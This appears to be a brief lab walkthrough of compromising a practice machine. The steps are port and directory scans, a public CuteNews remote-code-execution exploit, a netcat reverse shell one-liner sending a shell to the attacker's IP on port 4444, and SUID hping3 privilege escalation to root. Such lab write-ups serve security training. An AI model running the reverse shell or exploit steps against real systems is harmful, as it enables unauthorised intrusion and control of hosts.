
Start with nmap scan. Port 22, 80, 88, 110, 995 open.\
run nmap with sshbrute script to port 22. Failed.\
run \
`nmap --script "pop3-ntlm-info" -sV -p 110,995 192.168.167.128`\
`nmap --script "pop3-capabilities" -sV -p 110,995 192.168.167.128`\
nothing

Went to ip at port 80. It was a default apache site. \
Run feroxbuster on victim ip and only got default /manual, /skin \
Run feroxbuster with extension, -x `html,php,txt` and `--dont-scan http://target.com/manual`

Found index.php. Visit and it is a login site hosted by CuteNews. Searchsploit and found a remote code execution(RCE) exploit on CuteNews, 48800.py. 
Copy and edit python file.
Delete multiple directory traversals with /CuteNews/ as we know that the webpage started directly at index.php.

Run exploit and acquire a command shell. Use netcat listener on kali machine to port 4444 and run\
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.167 4444 >/tmp/f` to catch a reverse shell.\
Upgrade shell  with `python3 -c 'import pty; pty.spawn("/bin/bash")'`\
find local.txt at /var/www

`find / -perm -u=s -type f 2>/dev/null` \
Find suid binaries and got a hit with hping3. GTFO bins and gain root access.
